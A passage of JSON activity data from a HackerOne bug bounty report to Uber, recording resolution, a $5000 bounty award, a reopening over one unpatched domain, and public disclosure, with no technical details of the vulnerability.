3.0.6.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-01T08:23:18.755Z","updated_at":"2016-06-01T08:23:18.755Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1015964,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This one should be fixed now, please let us know if you can confirm it's `Resolved`.","markdown_message":"\u003cp\u003eThis one should be fixed now, please let us know if you can confirm it\u0026#39;s \u003ccode\u003eResolved\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-15T20:52:50.319Z","updated_at":"2016-06-15T20:52:50.319Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1016002,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yep seems so","markdown_message":"\u003cp\u003eyep seems so\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-15T21:22:36.346Z","updated_at":"2016-06-15T21:22:36.346Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1016003,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yep seems so","markdown_message":"\u003cp\u003eyep seems so\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-15T21:22:55.684Z","updated_at":"2016-06-15T21:22:55.684Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043374,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@jouko, thanks for the good find and we encourage you to continue bug hunting in the future!","markdown_message":"\u003cp\u003e\u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e, thanks for the good find and we encourage you to continue bug hunting in the future!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-28T16:16:15.600Z","updated_at":"2016-06-28T16:16:15.600Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"bounty_amount":"5000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"jouko","url":"/jouko"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks!","markdown_message":"\u003cp\u003ethanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-28T17:30:14.824Z","updated_at":"2016-06-28T17:30:14.824Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043559,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-28T17:33:37.117Z","updated_at":"2016-06-28T17:33:37.117Z","first_to_agree":true,"actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1086929,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Hey @jouko, we actually found a domain that wasn't updated when we first resolved this report. I'm going to reopen this report so it doesn't publicly disclose quite yet until we've had a chance to update that domain. I hope you don't mind, we can approve public disclosure once we've finished updating! Thanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e, we actually found a domain that wasn\u0026#39;t updated when we first resolved this report. I\u0026#39;m going to reopen this report so it doesn\u0026#39;t publicly disclose quite yet until we\u0026#39;ve had a chance to update that domain. I hope you don\u0026#39;t mind, we can approve public disclosure once we\u0026#39;ve finished updating! Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-25T23:48:31.554Z","updated_at":"2016-07-25T23:48:31.554Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1091244,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @jouko we got the remaining domain cleaned up. Sorry about that. Thanks for being understanding!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e we got the remaining domain cleaned up. Sorry about that. Thanks for being understanding!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-27T17:45:01.810Z","updated_at":"2016-07-27T17:45:01.810Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1091250,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since we re-opened the report you'll have to approve public disclosure again but I'm requesting it now so you can approve it whenever convenient. Thanks again for the report!","markdown_message":"\u003cp\u003eSince we re-opened the report you\u0026#39;ll have to approve public disclosure again but I\u0026#39;m requesting it now so you can approve it whenever convenient. Thanks again for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-27T17:46:15.503Z","updated_at":"2016-07-27T17:46:15.503Z","first_to_agree":true,"actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1091531,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-27T19:39:41.760Z","updated_at":"2016-07-27T19:39:41.760Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1091532,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-27T19:39:41.901Z","updated_at":"2016-07-27T19:39:41.901Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}